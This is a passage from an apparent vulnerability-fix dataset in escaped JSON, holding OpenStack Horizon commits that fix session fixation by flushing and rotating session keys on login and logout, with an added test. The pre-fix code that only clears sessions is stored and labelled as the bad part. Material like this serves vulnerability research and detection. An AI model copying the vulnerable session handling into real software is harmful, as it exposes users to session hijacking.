attribute:: token\n\n        The id of the Keystone token associated with the current user\/tenant.\n\n    .. attribute:: username\n\n        The name of the current user.\n\n    .. attribute:: tenant_id\n\n        The id of the Keystone tenant for the current user\/token.\n\n    .. attribute:: tenant_name\n\n        The name of the Keystone tenant for the current user\/token.\n\n    .. attribute:: service_catalog\n\n        The ``ServiceCatalog`` data returned by Keystone.\n\n    .. attribute:: roles\n\n        A list of dictionaries containing role names and ids as returned\n        by Keystone.\n\n    .. attribute:: admin\n\n        Boolean value indicating whether or not this user has admin\n        privileges. Internally mapped to :meth:`horizon.users.User.is_admin`.\n    \"\"\"\n    def __init__(self, id=None, token=None, user=None, tenant_id=None,\n                    service_catalog=None, tenant_name=None, roles=None,\n                    authorized_tenants=None, request=None):\n        self.id = id\n        self.token = token\n        self.username = user\n        self.tenant_id = tenant_id\n        self.tenant_name = tenant_name\n        self.service_catalog = service_catalog\n        self.roles = roles or []\n        self._authorized_tenants = authorized_tenants\n        # Store the request for lazy fetching of auth'd tenants\n        self._request = request\n\n    def is_authenticated(self):\n        \"\"\"\n        Evaluates whether this :class:`.User` instance has been authenticated.\n        Returns ``True`` or ``False``.\n        \"\"\"\n        # TODO: deal with token expiration\n        return self.token\n\n    @property\n    def admin(self):\n        return self.is_admin()\n\n    def is_admin(self):\n        \"\"\"\n        Evaluates whether this user has admin privileges. Returns\n        ``True`` or ``False``.\n        \"\"\"\n        for role in self.roles:\n            if role['name'].lower() == 'admin':\n                return True\n        return False\n\n    def get_and_delete_messages(self):\n        \"\"\"\n        Placeholder function for parity with\n        ``django.contrib.auth.models.User``.\n        \"\"\"\n        return []\n\n    @property\n    def authorized_tenants(self):\n        if self.is_authenticated() and self._authorized_tenants is None:\n            try:\n                token = self._request.session.get(\"unscoped_token\", self.token)\n                authd = api.tenant_list_for_token(self._request, token)\n            except:\n                authd = []\n                LOG.exception('Could not retrieve tenant list.')\n            self._authorized_tenants = authd\n        return self._authorized_tenants\n\n    @authorized_tenants.setter\n    def authorized_tenants(self, tenant_list):\n        self._authorized_tenants = tenant_list\n"},"\/horizon\/views\/auth.py":{"changes":[{"diff":"\n \n def logout(request):\n     \"\"\" Clears the session and logs the current user out. \"\"\"\n-    request.session.clear()\n+    request.user_logout()\n     # FIXME(gabriel): we don't ship a view named splash\n     return shortcuts.redirect('spla","add":1,"remove":1,"filename":"\/horizon\/views\/auth.py","badparts":["    request.session.clear()"],"goodparts":["    request.user_logout()"]},{"diff":"\n \n def logout(request):\n     \"\"\" Clears the session and logs the current user out. \"\"\"\n-    request.session.clear()\n+    request.user_logout()\n     # FIXME(gabriel): we don't ship a view named splash\n     return shortcuts.redirect('spla","add":1,"remove":1,"filename":"\/horizon\/views\/auth.py","badparts":["    request.session.clear()"],"goodparts":["    request.user_logout()"]}],"source":"\n import logging from django import shortcuts from django.conf import settings from django.contrib.auth import REDIRECT_FIELD_NAME from django.utils.translation import ugettext as _ import horizon from horizon import api from horizon import exceptions from horizon import forms from horizon import users from horizon.base import Horizon from horizon.views.auth_forms import Login, LoginWithTenant, _set_session_data LOG=logging.getLogger(__name__) def user_home(request): \"\"\" Reversible named view to direct a user to the appropriate homepage. \"\"\" return shortcuts.redirect(horizon.get_user_home(request.user)) class LoginView(forms.ModalFormView): \"\"\" Logs in a user and redirects them to the URL specified by :func:`horizon.get_user_home`. \"\"\" form_class=Login template_name=\"horizon\/auth\/login.html\" def get_context_data(self, **kwargs): context=super(LoginView, self).get_context_data(**kwargs) redirect_to=self.request.REQUEST.get(REDIRECT_FIELD_NAME, \"\") context[\"redirect_field_name\"]=REDIRECT_FIELD_NAME context[\"next\"]=redirect_to return context def get_initial(self): initial=super(LoginView, self).get_initial() current_region=self.request.session.get('region_endpoint', None) requested_region=self.request.GET.get('region', None) regions=dict(getattr(settings, \"AVAILABLE_REGIONS\",[])) if requested_region in regions and requested_region !=current_region: initial.update({'region': requested_region}) return initial def switch_tenants(request, tenant_id): \"\"\" Swaps a user from one tenant to another using the unscoped token from Keystone to exchange scoped tokens for the new tenant. \"\"\" form, handled=LoginWithTenant.maybe_handle( request, initial={'tenant': tenant_id, 'username': request.user.username}) if handled: return handled unscoped_token=request.session.get('unscoped_token', None) if unscoped_token: try: token=api.token_create_scoped(request, tenant_id, unscoped_token) _set_session_data(request, token) user=users.User(users.get_user_from_request(request)) return shortcuts.redirect(Horizon.get_user_home(user)) except: exceptions.handle(request, _(\"You are not authorized for that tenant.\")) return shortcuts.redirect(\"horizon:auth_login\") def logout(request): \"\"\" Clears the session and logs the current user out. \"\"\" request.session.clear() return shortcuts.redirect('splash') ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\nimport logging\n\nfrom django import shortcuts\nfrom django.conf import settings\nfrom django.contrib.auth import REDIRECT_FIELD_NAME\nfrom django.utils.translation import ugettext as _\n\nimport horizon\nfrom horizon import api\nfrom horizon import exceptions\nfrom horizon import forms\nfrom horizon import users\nfrom horizon.base import Horizon\nfrom horizon.views.auth_forms import Login, LoginWithTenant, _set_session_data\n\n\nLOG = logging.getLogger(__name__)\n\n\ndef user_home(request):\n    \"\"\" Reversible named view to direct a user to the appropriate homepage. \"\"\"\n    return shortcuts.redirect(horizon.get_user_home(request.user))\n\n\nclass LoginView(forms.ModalFormView):\n    \"\"\"\n    Logs in a user and redirects them to the URL specified by\n    :func:`horizon.get_user_home`.\n    \"\"\"\n    form_class = Login\n    template_name = \"horizon\/auth\/login.html\"\n\n    def get_context_data(self, **kwargs):\n        context = super(LoginView, self).get_context_data(**kwargs)\n        redirect_to = self.request.REQUEST.get(REDIRECT_FIELD_NAME, \"\")\n        context[\"redirect_field_name\"] = REDIRECT_FIELD_NAME\n        context[\"next\"] = redirect_to\n        return context\n\n    def get_initial(self):\n        initial = super(LoginView, self).get_initial()\n        current_region = self.request.session.get('region_endpoint', None)\n        requested_region = self.request.GET.get('region', None)\n        regions = dict(getattr(settings, \"AVAILABLE_REGIONS\", []))\n        if requested_region in regions and requested_region != current_region:\n            initial.update({'region': requested_region})\n        return initial\n\n\ndef switch_tenants(request, tenant_id):\n    \"\"\"\n    Swaps a user from one tenant to another using the unscoped token from\n    Keystone to exchange scoped tokens for the new tenant.\n    \"\"\"\n    form, handled = LoginWithTenant.maybe_handle(\n            request, initial={'tenant': tenant_id,\n                              'username': request.user.username})\n    if handled:\n        return handled\n\n    unscoped_token = request.session.get('unscoped_token', None)\n    if unscoped_token:\n        try:\n            token = api.token_create_scoped(request,\n                                            tenant_id,\n                                            unscoped_token)\n            _set_session_data(request, token)\n            user = users.User(users.get_user_from_request(request))\n            return shortcuts.redirect(Horizon.get_user_home(user))\n        except:\n            exceptions.handle(request,\n                              _(\"You are not authorized for that tenant.\"))\n\n    return shortcuts.redirect(\"horizon:auth_login\")\n\n\ndef logout(request):\n    \"\"\" Clears the session and logs the current user out. \"\"\"\n    request.session.clear()\n    # FIXME(gabriel): we don't ship a view named splash\n    return shortcuts.redirect('splash')\n"},"\/horizon\/views\/auth_forms.py":{"changes":[{"diff":"\n                 # If we get here we don't want to show a stack trace to the\n                 # user. However, if we fail here, there may be bad session\n                 # data that's been cached already.\n-                request.session.clear()\n+                request.user_logout()\n                 exceptions.handle(request,\n                                   message=_(\"An error occurred authenticating.\"\n                                             \" Please try again later.\"),\n","add":1,"remove":1,"filename":"\/horizon\/views\/auth_forms.py","badparts":["                request.session.clear()"],"goodparts":["                request.user_logout()"]},{"diff":"\n                 # If we get here we don't want to show a stack trace to the\n                 # user. However, if we fail here, there may be bad session\n                 # data that's been cached already.\n-                request.session.clear()\n+                request.user_logout()\n                 exceptions.handle(request,\n                                   message=_(\"An error occurred authenticating.\"\n                                             \" Please try again later.\"),\n","add":1,"remove":1,"filename":"\/horizon\/views\/auth_forms.py","badparts":["                request.session.clear()"],"goodparts":["                request.user_logout()"]}],"source":"\n \"\"\" Forms used for Horizon's auth mechanisms. \"\"\" import logging from django import shortcuts from django.conf import settings from django.contrib import messages from django.contrib.auth import REDIRECT_FIELD_NAME from django.utils.translation import ugettext as _ from keystoneclient import exceptions as keystone_exceptions from horizon import api from horizon import base from horizon import exceptions from horizon import forms from horizon import users LOG=logging.getLogger(__name__) def _set_session_data(request, token): request.session['serviceCatalog']=token.serviceCatalog request.session['tenant']=token.tenant['name'] request.session['tenant_id']=token.tenant['id'] request.session['token']=token.id request.session['user_name']=token.user['name'] request.session['user_id']=token.user['id'] request.session['roles']=token.user['roles'] class Login(forms.SelfHandlingForm): \"\"\" Form used for logging in a user. Handles authentication with Keystone, choosing a tenant, and fetching a scoped token token for that tenant. Redirects to the URL returned by:meth:`horizon.get_user_home` if successful. Subclass of:class:`~horizon.forms.SelfHandlingForm`. \"\"\" region=forms.ChoiceField(label=_(\"Region\"), required=False) username=forms.CharField(label=_(\"User Name\")) password=forms.CharField(label=_(\"Password\"), widget=forms.PasswordInput(render_value=False)) def __init__(self, *args, **kwargs): super(Login, self).__init__(*args, **kwargs) default_region=(settings.OPENSTACK_KEYSTONE_URL, \"Default Region\") regions=getattr(settings, 'AVAILABLE_REGIONS',[default_region]) self.fields['region'].choices=regions if len(regions)==1: self.fields['region'].initial=default_region[0] self.fields['region'].widget=forms.widgets.HiddenInput() def handle(self, request, data): endpoint=data.get('region', None) or settings.OPENSTACK_KEYSTONE_URL region_name=dict(self.fields['region'].choices)[endpoint] request.session['region_endpoint']=endpoint request.session['region_name']=region_name redirect_to=request.REQUEST.get(REDIRECT_FIELD_NAME, \"\") if data.get('tenant', None): try: token=api.token_create(request, data.get('tenant'), data['username'], data['password']) tenants=api.tenant_list_for_token(request, token.id) except: msg=_('Unable to authenticate for that project.') exceptions.handle(request, message=msg, escalate=True) _set_session_data(request, token) user=users.get_user_from_request(request) redirect=redirect_to or base.Horizon.get_user_home(user) return shortcuts.redirect(redirect) elif data.get('username', None): try: unscoped_token=api.token_create(request, '', data['username'], data['password']) except keystone_exceptions.Unauthorized: exceptions.handle(request, _('Invalid user name or password.')) except: request.session.clear() exceptions.handle(request, message=_(\"An error occurred authenticating.\" \" Please try again later.\"), escalate=True) request.session['unscoped_token']=unscoped_token.id request.user.username=data['username'] try: tenants=api.tenant_list_for_token(request, unscoped_token.id) except: exceptions.handle(request) tenants=[] if not tenants: messages.error(request, _('You are not authorized for any projects.') % {\"user\": data['username']}, extra_tags=\"login\") return while tenants: tenant=tenants.pop() try: token=api.token_create_scoped(request, tenant.id, unscoped_token.id) break except: exceptions.handle(request, ignore=True) token=None if token is None: raise exceptions.NotAuthorized( _(\"You are not authorized for any available projects.\")) _set_session_data(request, token) user=users.get_user_from_request(request) redirect=redirect_to or base.Horizon.get_user_home(user) return shortcuts.redirect(redirect) class LoginWithTenant(Login): \"\"\" Exactly like:class:`.Login` but includes the tenant id as a field so that the process of choosing a default tenant is bypassed. \"\"\" region=forms.ChoiceField(required=False) username=forms.CharField(max_length=\"20\", widget=forms.TextInput(attrs={'readonly': 'readonly'})) tenant=forms.CharField(widget=forms.HiddenInput()) ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"\nForms used for Horizon's auth mechanisms.\n\"\"\"\n\nimport logging\n\nfrom django import shortcuts\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.contrib.auth import REDIRECT_FIELD_NAME\nfrom django.utils.translation import ugettext as _\nfrom keystoneclient import exceptions as keystone_exceptions\n\nfrom horizon import api\nfrom horizon import base\nfrom horizon import exceptions\nfrom horizon import forms\nfrom horizon import users\n\n\nLOG = logging.getLogger(__name__)\n\n\ndef _set_session_data(request, token):\n    request.session['serviceCatalog'] = token.serviceCatalog\n    request.session['tenant'] = token.tenant['name']\n    request.session['tenant_id'] = token.tenant['id']\n    request.session['token'] = token.id\n    request.session['user_name'] = token.user['name']\n    request.session['user_id'] = token.user['id']\n    request.session['roles'] = token.user['roles']\n\n\nclass Login(forms.SelfHandlingForm):\n    \"\"\" Form used for logging in a user.\n\n    Handles authentication with Keystone, choosing a tenant, and fetching\n    a scoped token token for that tenant. Redirects to the URL returned\n    by :meth:`horizon.get_user_home` if successful.\n\n    Subclass of :class:`~horizon.forms.SelfHandlingForm`.\n    \"\"\"\n    region = forms.ChoiceField(label=_(\"Region\"), required=False)\n    username = forms.CharField(label=_(\"User Name\"))\n    password = forms.CharField(label=_(\"Password\"),\n                               widget=forms.PasswordInput(render_value=False))\n\n    def __init__(self, *args, **kwargs):\n        super(Login, self).__init__(*args, **kwargs)\n        # FIXME(gabriel): When we switch to region-only settings, we can\n        # remove this default region business.\n        default_region = (settings.OPENSTACK_KEYSTONE_URL, \"Default Region\")\n        regions = getattr(settings, 'AVAILABLE_REGIONS', [default_region])\n        self.fields['region'].choices = regions\n        if len(regions) == 1:\n            self.fields['region'].initial = default_region[0]\n            self.fields['region'].widget = forms.widgets.HiddenInput()\n\n    def handle(self, request, data):\n        # For now we'll allow fallback to OPENSTACK_KEYSTONE_URL if the\n        # form post doesn't include a region.\n        endpoint = data.get('region', None) or settings.OPENSTACK_KEYSTONE_URL\n        region_name = dict(self.fields['region'].choices)[endpoint]\n        request.session['region_endpoint'] = endpoint\n        request.session['region_name'] = region_name\n\n        redirect_to = request.REQUEST.get(REDIRECT_FIELD_NAME, \"\")\n\n        if data.get('tenant', None):\n            try:\n                token = api.token_create(request,\n                                         data.get('tenant'),\n                                         data['username'],\n                                         data['password'])\n                tenants = api.tenant_list_for_token(request, token.id)\n            except:\n                msg = _('Unable to authenticate for that project.')\n                exceptions.handle(request,\n                                  message=msg,\n                                  escalate=True)\n            _set_session_data(request, token)\n            user = users.get_user_from_request(request)\n            redirect = redirect_to or base.Horizon.get_user_home(user)\n            return shortcuts.redirect(redirect)\n\n        elif data.get('username', None):\n            try:\n                unscoped_token = api.token_create(request,\n                                                  '',\n                                                  data['username'],\n                                                  data['password'])\n            except keystone_exceptions.Unauthorized:\n                exceptions.handle(request,\n                                  _('Invalid user name or password.'))\n            except:\n                # If we get here we don't want to show a stack trace to the\n                # user. However, if we fail here, there may be bad session\n                # data that's been cached already.\n                request.session.clear()\n                exceptions.handle(request,\n                                  message=_(\"An error occurred authenticating.\"\n                                            \" Please try again later.\"),\n                                  escalate=True)\n\n            # Unscoped token\n            request.session['unscoped_token'] = unscoped_token.id\n            request.user.username = data['username']\n\n            # Get the tenant list, and log in using first tenant\n            # FIXME (anthony): add tenant chooser here?\n            try:\n                tenants = api.tenant_list_for_token(request, unscoped_token.id)\n            except:\n                exceptions.handle(request)\n                tenants = []\n\n            # Abort if there are no valid tenants for this user\n            if not tenants:\n                messages.error(request,\n                               _('You are not authorized for any projects.') %\n                                {\"user\": data['username']},\n                               extra_tags=\"login\")\n                return\n\n            # Create a token.\n            # NOTE(gabriel): Keystone can return tenants that you're\n            # authorized to administer but not to log into as a user, so in\n            # the case of an Unauthorized error we should iterate through\n            # the tenants until one succeeds or we've failed them all.\n            while tenants:\n                tenant = tenants.pop()\n                try:\n                    token = api.token_create_scoped(request,\n                                                    tenant.id,\n                                                    unscoped_token.id)\n                    break\n                except:\n                    # This will continue for recognized Unauthorized\n                    # exceptions from keystoneclient.\n                    exceptions.handle(request, ignore=True)\n                    token = None\n            if token is None:\n                raise exceptions.NotAuthorized(\n                    _(\"You are not authorized for any available projects.\"))\n\n            _set_session_data(request, token)\n            user = users.get_user_from_request(request)\n        redirect = redirect_to or base.Horizon.get_user_home(user)\n        return shortcuts.redirect(redirect)\n\n\nclass LoginWithTenant(Login):\n    \"\"\"\n    Exactly like :class:`.Login` but includes the tenant id as a field\n    so that the process of choosing a default tenant is bypassed.\n    \"\"\"\n    region = forms.ChoiceField(required=False)\n    username = forms.CharField(max_length=\"20\",\n                       widget=forms.TextInput(attrs={'readonly': 'readonly'}))\n    tenant = forms.CharField(widget=forms.HiddenInput())\n"}},"msg":"Fixes lp978896 -- Session fixation security fix\n\nRotates session tokens on logout, and properly clears sessions\nto prevent data leakage.\n\nChange-Id: I52d03576d07b1e023a7730857156d0da1887b1df"}},"https:\/\/github.com\/daespinel\/horizon":{"041b1c44c7d6cf5429505067c32f8f35166a8bab":{"url":"https:\/\/api.github.com\/repos\/daespinel\/horizon\/commits\/041b1c44c7d6cf5429505067c32f8f35166a8bab","html_url":"https:\/\/github.com\/daespinel\/horizon\/commit\/041b1c44c7d6cf5429505067c32f8f35166a8bab","sha":"041b1c44c7d6cf5429505067c32f8f35166a8bab","keyword":"session fixation prevent","diff":"diff --git a\/horizon\/exceptions.py b\/horizon\/exceptions.py\nindex 7af8a0a69..778719e3d 100644\n--- a\/horizon\/exceptions.py\n+++ b\/horizon\/exceptions.py\n@@ -203,7 +203,7 @@ class indicating the type of exception that was encountered will be\n     if issubclass(exc_type, UNAUTHORIZED):\n         if ignore:\n             return NotAuthorized\n-        request.session.clear()\n+        request.user_logout()\n         if not handled:\n             LOG.debug(\"Unauthorized: %s\" % exc_value)\n             # We get some pretty useless error messages back from\ndiff --git a\/horizon\/middleware.py b\/horizon\/middleware.py\nindex f20c1f09e..f141ff362 100644\n--- a\/horizon\/middleware.py\n+++ b\/horizon\/middleware.py\n@@ -49,6 +49,15 @@ def process_request(self, request):\n \n         Adds a :class:`~horizon.users.User` object to ``request.user``.\n         \"\"\"\n+        # A quick and dirty way to log users out\n+        def user_logout(request):\n+            if hasattr(request, '_cached_user'):\n+                del request._cached_user\n+            # Use flush instead of clear, so we rotate session keys in\n+            # addition to clearing all the session data\n+            request.session.flush()\n+        request.__class__.user_logout = user_logout\n+\n         request.__class__.user = users.LazyUser()\n         request.horizon = {'dashboard': None, 'panel': None}\n \ndiff --git a\/horizon\/tests\/auth_tests.py b\/horizon\/tests\/auth_tests.py\nindex ba1647777..9f295d0c0 100644\n--- a\/horizon\/tests\/auth_tests.py\n+++ b\/horizon\/tests\/auth_tests.py\n@@ -18,6 +18,8 @@\n #    License for the specific language governing permissions and limitations\n #    under the License.\n \n+import time\n+\n from django import http\n from django.core.urlresolvers import reverse\n from keystoneclient import exceptions as keystone_exceptions\n@@ -220,3 +222,53 @@ def test_logout(self):\n \n         self.assertRedirectsNoFollow(res, reverse('splash'))\n         self.assertNotIn(KEY, self.client.session)\n+\n+    def test_session_fixation(self):\n+        session_ids = []\n+        form_data = {'method': 'Login',\n+                     'region': 'http:\/\/localhost:5000\/v2.0',\n+                     'password': self.user.password,\n+                     'username': self.user.name}\n+\n+        self.mox.StubOutWithMock(api, 'token_create')\n+        self.mox.StubOutWithMock(api, 'tenant_list_for_token')\n+        self.mox.StubOutWithMock(api, 'token_create_scoped')\n+\n+        aToken = self.tokens.unscoped_token\n+        bToken = self.tokens.scoped_token\n+\n+        api.token_create(IsA(http.HttpRequest), \"\", self.user.name,\n+                         self.user.password).AndReturn(aToken)\n+        api.tenant_list_for_token(IsA(http.HttpRequest),\n+                                  aToken.id).AndReturn([self.tenants.first()])\n+        api.token_create_scoped(IsA(http.HttpRequest),\n+                                self.tenant.id,\n+                                aToken.id).AndReturn(bToken)\n+\n+        api.token_create(IsA(http.HttpRequest), \"\", self.user.name,\n+                         self.user.password).AndReturn(aToken)\n+        api.tenant_list_for_token(IsA(http.HttpRequest),\n+                                  aToken.id).AndReturn([self.tenants.first()])\n+        api.token_create_scoped(IsA(http.HttpRequest),\n+                                self.tenant.id,\n+                                aToken.id).AndReturn(bToken)\n+        self.mox.ReplayAll()\n+\n+        res = self.client.get(reverse('horizon:auth_login'))\n+        self.assertEqual(res.cookies.get('sessionid'), None)\n+        res = self.client.post(reverse('horizon:auth_login'), form_data)\n+        session_ids.append(res.cookies['sessionid'].value)\n+\n+        self.assertEquals(self.client.session['user_name'],\n+                          self.user.name)\n+        self.client.session['foobar'] = 'MY TEST VALUE'\n+        res = self.client.get(reverse('horizon:auth_logout'))\n+        session_ids.append(res.cookies['sessionid'].value)\n+        self.assertEqual(len(self.client.session.items()), 0)\n+        # Sleep for 1 second so the session values are different if\n+        # using the signed_cookies backend.\n+        time.sleep(1)\n+        res = self.client.post(reverse('horizon:auth_login'), form_data)\n+        session_ids.append(res.cookies['sessionid'].value)\n+        # Make sure all 3 session id values are different\n+        self.assertEqual(len(session_ids), len(set(session_ids)))\ndiff --git a\/horizon\/users.py b\/horizon\/users.py\nindex f5dcde81a..6e6be8e5a 100644\n--- a\/horizon\/users.py\n+++ b\/horizon\/users.py\n@@ -59,7 +59,7 @@ def get_user_from_request(request):\n         # If any of those keys are missing from the session it is\n         # overwhelmingly likely that we're dealing with an outdated session.\n         LOG.exception(\"Error while creating User from session.\")\n-        request.session.clear()\n+        request.user_logout()\n         raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                          \"Please log in again.\"))\n \ndiff --git a\/horizon\/views\/auth.py b\/horizon\/views\/auth.py\nindex b48f24a65..5120eed76 100644\n--- a\/horizon\/views\/auth.py\n+++ b\/horizon\/views\/auth.py\n@@ -96,6 +96,6 @@ def switch_tenants(request, tenant_id):\n \n def logout(request):\n     \"\"\" Clears the session and logs the current user out. \"\"\"\n-    request.session.clear()\n+    request.user_logout()\n     # FIXME(gabriel): we don't ship a view named splash\n     return shortcuts.redirect('splash')\ndiff --git a\/horizon\/views\/auth_forms.py b\/horizon\/views\/auth_forms.py\nindex 287448685..2ebecfcda 100644\n--- a\/horizon\/views\/auth_forms.py\n+++ b\/horizon\/views\/auth_forms.py\n@@ -77,6 +77,16 @@ def __init__(self, *args, **kwargs):\n             self.fields['region'].widget = forms.widgets.HiddenInput()\n \n     def handle(self, request, data):\n+        if 'user_name' in request.session:\n+            if request.session['user_name'] != data['username']:\n+                # To avoid reusing another user's session, create a\n+                # new, empty session if the existing session\n+                # corresponds to a different authenticated user.\n+                request.session.flush()\n+        # Always cycle the session key when viewing the login form to\n+        # prevent session fixation\n+        request.session.cycle_key()\n+\n         # For now we'll allow fallback to OPENSTACK_KEYSTONE_URL if the\n         # form post doesn't include a region.\n         endpoint = data.get('region', None) or settings.OPENSTACK_KEYSTONE_URL\n@@ -116,7 +126,7 @@ def handle(self, request, data):\n                 # If we get here we don't want to show a stack trace to the\n                 # user. However, if we fail here, there may be bad session\n                 # data that's been cached already.\n-                request.session.clear()\n+                request.user_logout()\n                 exceptions.handle(request,\n                                   message=_(\"An error occurred authenticating.\"\n                                             \" Please try again later.\"),\n","message":"","files":{"\/horizon\/exceptions.py":{"changes":[{"diff":"\n     if issubclass(exc_type, UNAUTHORIZED):\n         if ignore:\n             return NotAuthorized\n-        request.session.clear()\n+        request.user_logout()\n         if not handled:\n             LOG.debug(\"Unauthorized: %s\" % exc_value)\n             # We get some pretty useless error messages back from","add":1,"remove":1,"filename":"\/horizon\/exceptions.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]},{"diff":"\n     if issubclass(exc_type, UNAUTHORIZED):\n         if ignore:\n             return NotAuthorized\n-        request.session.clear()\n+        request.user_logout()\n         if not handled:\n             LOG.debug(\"Unauthorized: %s\" % exc_value)\n             # We get some pretty useless error messages back from","add":1,"remove":1,"filename":"\/horizon\/exceptions.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]}],"source":"\n \"\"\" Exceptions raised by the Horizon code and the machinery for handling them. \"\"\" import logging import sys from django.conf import settings from django.contrib import messages from django.utils.translation import ugettext as _ from cloudfiles import errors as swiftclient from glanceclient.common import exceptions as glanceclient from keystoneclient import exceptions as keystoneclient from novaclient import exceptions as novaclient LOG=logging.getLogger(__name__) class HorizonException(Exception): \"\"\" Base exception class for distinguishing our own exception classes. \"\"\" pass class Http302(HorizonException): \"\"\" Error class which can be raised from within a handler to cause an early bailout and redirect at the middleware level. \"\"\" status_code=302 def __init__(self, location, message=None): self.location=location self.message=message class NotAuthorized(HorizonException): \"\"\" Raised whenever a user attempts to access a resource which they do not have role-based access to(such as when failing the :func:`~horizon.decorators.require_roles` decorator). The included:class:`~horizon.middleware.HorizonMiddleware` catches ``NotAuthorized`` and handles it gracefully by displaying an error message and redirecting the user to a login page. \"\"\" status_code=401 class NotAuthenticated(HorizonException): \"\"\" Raised when a user is trying to make requests and they are not logged in. The included:class:`~horizon.middleware.HorizonMiddleware` catches ``NotAuthenticated`` and handles it gracefully by displaying an error message and redirecting the user to a login page. \"\"\" status_code=403 class NotFound(HorizonException): \"\"\" Generic error to replace all \"Not Found\"-type API errors. \"\"\" status_code=404 class RecoverableError(HorizonException): \"\"\" Generic error to replace any \"Recoverable\"-type API errors. \"\"\" status_code=100 class ServiceCatalogException(HorizonException): \"\"\" Raised when a requested service is not available in the ``ServiceCatalog`` returned by Keystone. \"\"\" def __init__(self, service_name): message='Invalid service catalog service: %s' % service_name super(ServiceCatalogException, self).__init__(message) class AlreadyExists(HorizonException): \"\"\" Exception to be raised when trying to create an API resource which already exists. \"\"\" def __init__(self, name, resource_type): self.attrs={\"name\": name, \"resource\": resource_type} self.msg='A %(resource)s with the name \"%(name)s\" already exists.' def __repr__(self): return self.msg % self.attrs def __unicode__(self): return _(self.msg) % self.attrs class HandledException(HorizonException): \"\"\" Used internally to track exceptions that have gone through :func:`horizon.exceptions.handle` more than once. \"\"\" def __init__(self, wrapped): self.wrapped=wrapped HORIZON_CONFIG=getattr(settings, \"HORIZON_CONFIG\",{}) EXCEPTION_CONFIG=HORIZON_CONFIG.get(\"exceptions\",{}) UNAUTHORIZED=(keystoneclient.Unauthorized, keystoneclient.Forbidden, novaclient.Unauthorized, novaclient.Forbidden, glanceclient.AuthorizationFailure, glanceclient.Unauthorized, swiftclient.AuthenticationFailed, swiftclient.AuthenticationError) UNAUTHORIZED +=tuple(EXCEPTION_CONFIG.get('unauthorized',[])) NOT_FOUND=(keystoneclient.NotFound, novaclient.NotFound, glanceclient.NotFound, swiftclient.NoSuchContainer, swiftclient.NoSuchObject) NOT_FOUND +=tuple(EXCEPTION_CONFIG.get('not_found',[])) RECOVERABLE=(keystoneclient.ClientException, keystoneclient.AuthorizationFailure, novaclient.ClientException, glanceclient.ClientException, swiftclient.Error, AlreadyExists) RECOVERABLE +=tuple(EXCEPTION_CONFIG.get('recoverable',[])) def handle(request, message=None, redirect=None, ignore=False, escalate=False): \"\"\" Centralized error handling for Horizon. Because Horizon consumes so many different APIs with completely different ``Exception`` types, it's necessary to have a centralized place for handling exceptions which may be raised. Exceptions are roughly divided into 3 types: problems. These result in being logged out and sent to the login screen. located via the API. These generally result in a user-facing error message, but are otherwise returned to the normal code flow. Optionally a redirect value may be passed to the error handler so users are returned to a different view than the one requested in addition to the error message. but drop directly back to the regular code flow. All other exceptions bubble the stack as normal unless the ``ignore`` argument is passed in as ``True``, in which case only unrecognized errors are bubbled. If the exception is not re-raised, an appropriate wrapper exception class indicating the type of exception that was encountered will be returned. \"\"\" exc_type, exc_value, exc_traceback=sys.exc_info() handled=issubclass(exc_type, HandledException) wrap=False if handled: exc_type, exc_value, exc_traceback=exc_value.wrapped wrap=True if issubclass(exc_type, HorizonException): message=exc_value elif message and \"%(exc)s\" in message: message=message %{\"exc\": exc_value} if issubclass(exc_type, UNAUTHORIZED): if ignore: return NotAuthorized request.session.clear() if not handled: LOG.debug(\"Unauthorized: %s\" % exc_value) fallback=_(\"Unauthorized. Please try logging in again.\") messages.error(request, message or fallback, extra_tags=\"login\") raise NotAuthorized if issubclass(exc_type, NOT_FOUND): wrap=True if not ignore and not handled: LOG.debug(\"Not Found: %s\" % exc_value) messages.error(request, message or exc_value) if redirect: raise Http302(redirect) if not escalate: return NotFound if issubclass(exc_type, RECOVERABLE): wrap=True if not ignore and not handled: LOG.debug(\"Recoverable error: %s\" % exc_value) messages.error(request, message or exc_value) if redirect: raise Http302(redirect) if not escalate: return RecoverableError if wrap: raise HandledException([exc_type, exc_value, exc_traceback]) raise exc_type, exc_value, exc_traceback ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"\nExceptions raised by the Horizon code and the machinery for handling them.\n\"\"\"\n\nimport logging\nimport sys\n\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.utils.translation import ugettext as _\nfrom cloudfiles import errors as swiftclient\nfrom glanceclient.common import 